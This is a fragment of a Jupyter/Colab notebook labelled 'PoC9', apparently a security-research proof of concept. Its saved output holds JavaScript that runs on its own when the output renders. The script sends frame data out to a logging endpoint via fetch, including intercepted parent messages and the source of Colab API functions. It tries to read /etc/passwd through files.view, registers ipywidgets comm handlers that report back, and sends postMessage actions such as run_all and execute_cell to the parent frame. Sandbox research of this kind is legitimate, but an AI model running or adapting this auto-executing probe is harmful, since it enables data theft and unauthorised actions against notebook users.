      "source": [
        "# PoC9 \u2014 message listener + all API sources + files.view fix + ipywidgets targets\n",
        "Passively captures parent\u2192frame messages, enumerates JS function sources, fixes files.view, registers ipywidgets comm targets, probes ungated parent actions."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "poc9_code"
      },
      "source": [
        "print('PoC9 running')"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(async function poc9() {\n  const B = 'https://colab.research.google.com/__poc9';\n  const log = async (tag, val) => {\n    try {\n      await fetch(B + '/' + tag + '?v=' + encodeURIComponent(String(val).slice(0, 500)));\n    } catch(e) {}\n  };\n\n  await log('start', location.host + '|' + Date.now());\n\n  // \u2500\u2500 PASSIVE MESSAGE LISTENER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // Capture everything the parent frame sends to us\n  const messages = [];\n  window.addEventListener('message', (e) => {\n    const entry = {\n      origin: e.origin,\n      data: JSON.stringify(e.data).slice(0, 300),\n      ports: e.ports ? e.ports.length : 0\n    };\n    messages.push(entry);\n  });\n\n  // Also check what we already have before any async delay\n  await log('MSG_window_name', window.name || 'empty');\n  await log('MSG_referrer', document.referrer || 'empty');\n  await log('MSG_origin', window.origin);\n\n  // \u2500\u2500 ALL COLAB API FUNCTION SOURCES \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // Enumerate toString() on everything \u2014 find more JS (non-native) functions\n  const gc = window.google.colab;\n  const sections = {\n    kernel: gc.kernel,\n    output: gc.output,\n    notebook: gc.notebook,\n    files: gc.files,\n  };\n\n  for (const [section, obj] of Object.entries(sections)) {\n    if (!obj) continue;\n    for (const key of Object.getOwnPropertyNames(obj)) {\n      try {\n        const val = obj[key];\n        if (typeof val === 'function') {\n          const src = val.toString();\n          if (!src.includes('[native code]')) {\n            await log('SRC_' + section + '_' + key, src.slice(0, 400));\n          } else {\n            await log('SRC_' + section + '_' + key, '[native]');\n          }\n        }\n      } catch(e) { await log('SRC_' + section + '_' + key + '_err', e.message); }\n    }\n  }\n  // openUrl\n  try {\n    const src = gc.openUrl.toString();\n    await log('SRC_openUrl', src.includes('[native code]') ? '[native]' : src.slice(0, 400));\n  } catch(e) {}\n\n  // \u2500\u2500 FILES.VIEW FIX \u2014 pass lineNumber as string \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try {\n    const r1 = await gc.files.view('/etc/passwd', '0');\n    await log('FILES_view_fixed_result', JSON.stringify(r1) || 'no_return');\n  } catch(e) { await log('FILES_view_fixed_err', e.name + '|' + e.message); }\n\n  try {\n    const r2 = await gc.files.view('/etc/passwd', 0);\n    await log('FILES_view_int_result', JSON.stringify(r2) || 'no_return');\n  } catch(e) { await log('FILES_view_int_err', e.name + '|' + e.message); }\n\n  // \u2500\u2500 COMMS: REGISTER WELL-KNOWN IPYWIDGETS TARGETS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  const widgetTargets = ['jupyter.widget', 'jupyter.widget.version', 'jupyter.widget.comm_info'];\n  for (const target of widgetTargets) {\n    try {\n      gc.kernel.comms.registerTarget(target, (comm, msg) => {\n        // Fire-and-forget log if handler is ever called\n        fetch(B + '/WIDGET_comm_fired?target=' + encodeURIComponent(target) +\n              '&msg=' + encodeURIComponent(JSON.stringify(msg).slice(0, 300)));\n      });\n      await log('COMMS_reg_' + target.replace(/\\./g, '_'), 'ok');\n    } catch(e) { await log('COMMS_reg_err_' + target.replace(/\\./g, '_'), e.message); }\n  }\n\n  // \u2500\u2500 POSTMESSAGE PROBE \u2014 action names the parent might handle ungated \u2500\u2500\u2500\u2500\u2500\n  const parentActions = [\n    'run_all',\n    'execute_cell',\n    'save_notebook',\n    'get_notebook_state',\n    'kernel_status',\n    'add_cell',\n    'open_url',\n    'navigate',\n    'focus_cell',\n    'set_metadata',\n  ];\n\n  for (const action of parentActions) {\n    window.parent.postMessage({action, target: 'notebook', isTrustedOutput: true}, '*');\n  }\n  await log('PARENT_msgs_sent', parentActions.join(','));\n\n  // \u2500\u2500 WAIT 2s THEN DUMP CAPTURED MESSAGES \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  await new Promise(r => setTimeout(r, 2000));\n  await log('MSG_count', messages.length);\n  for (let i = 0; i < messages.length; i++) {\n    await log('MSG_' + i + '_origin', messages[i].origin);\n    await log('MSG_' + i + '_data', messages[i].data);\n  }\n\n  await log('done', Date.now());\n})();\n",
            "text/plain": [
              "<poc9_autoexec>"
            ]
          },
          "metadata": {}
        }
      ],
      "execution_count": 1
    }
  ]
}